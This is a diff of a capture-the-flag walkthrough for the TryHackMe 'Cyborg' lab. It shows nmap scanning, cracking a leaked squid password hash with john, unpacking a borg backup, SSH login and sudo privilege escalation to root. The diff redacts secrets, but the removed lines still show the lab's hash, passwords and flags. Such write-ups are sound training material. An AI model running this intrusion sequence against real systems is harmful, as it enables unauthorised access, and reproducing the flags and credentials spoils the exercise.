@@ -1,8 +1,14 @@
 tryhackme/cyborg - easy
 
 # Enumeration
-nmap
+- nmap
+  - SYN Scan
+  - default nmap script
+  - enabled host discovery
+  - network service banner grabbing
+  - probing
 ```
+#모든 포트 정보 수집
 ┌──(kali㉿kali)-[~/tryhackme/cyborg]
 └─$ sudo nmap -p- --max-retries 1 -sS -Pn -n --open 10.10.54.133 -oA tcpAll                           
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-11 16:27 KST
@@ -17,6 +23,7 @@ PORT   STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 101.96 seconds
 
+# 자세한 정보 수집
 ┌──(kali㉿kali)-[~/tryhackme/cyborg]
 └─$ sudo nmap -p 22,80 -Pn -n --open -sV -sC --min-rate 2000 -sS 10.10.54.133 -oA tcpDetailed         
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-11 16:30 KST
@@ -37,12 +44,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 17.39 seconds
 ```
+
 ## web enumeration
 `/etc/squid/passwd` -> music_archive credentials infomation
 ```
-music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
+music_archive:<before_hash>
 
-music_archive:squidward
+music_archive:<after_hash>
 
 ```
 `admin` -> admin information landing page
@@ -114,10 +122,6 @@ Finished
 ===============================================================
 
 ```
-`/admin` directory brute frocing used gobuster
-```
-
-```
 
 
 # hash-cracking
@@ -145,7 +149,7 @@ Possible Hashs:
 
 
 ┌──(kali㉿kali)-[~/tryhackme/cyborg]
-└─$ echo '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' > music_archive.hash
+└─$ echo '<before_hash>' > music_archive.hash
 
 ┌──(kali㉿kali)-[~/tryhackme/cyborg]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt music_archive.hash 
@@ -155,7 +159,7 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
 Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-squidward        (?)     
+<after_hash>        (?)     
 1g 0:00:00:00 DONE (2024-05-11 16:46) 2.173g/s 84730p/s 84730c/s 84730C/s 112806..samantha5
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
@@ -179,7 +183,7 @@ See https://borgbackup.readthedocs.io/
 ```
 
 # borg
-borgbackup은 중복을 제거하고 데이터를 안전하게 보관하기 위한 백업 프로그
+borgbackup은 중복을 제거하고 데이터를 안전하게 보관하기 위한 백업 프로그램
 ```
 # install
 ┌──(kali㉿kali)-[~/tryhackme/cyborg]
@@ -213,7 +217,7 @@ shoutout to all the people who have gotten to this stage whoop whoop!"
 └─$ cat note.txt        
 Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!
 
-alex:S3cretP@s3
+alex:<password>
 
 
 ```
@@ -245,8 +249,7 @@ applicable law.
 alex@ubuntu:~$ ls
 Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
 alex@ubuntu:~$ cat user.txt 
-flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
-
+flag{플래그 가리기기}
 
 ```
 
@@ -281,7 +284,7 @@ User alex may run the following commands on ubuntu:
 ```
 
 
-# 권한상승
+# 권한 상승
 ```
 alex@ubuntu:~$ ls -al /etc/mp3backups/backup.sh 
 -r-xr-xr-- 1 alex alex 1083 Dec 30  2020 /etc/mp3backups/backup.sh
@@ -311,5 +314,5 @@ root@ubuntu:~# cd /root
 root@ubuntu:/root# ls
 root.txt
 root@ubuntu:/root# cat root.txt 
-flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
+flag{플래그 가리기}
 ```
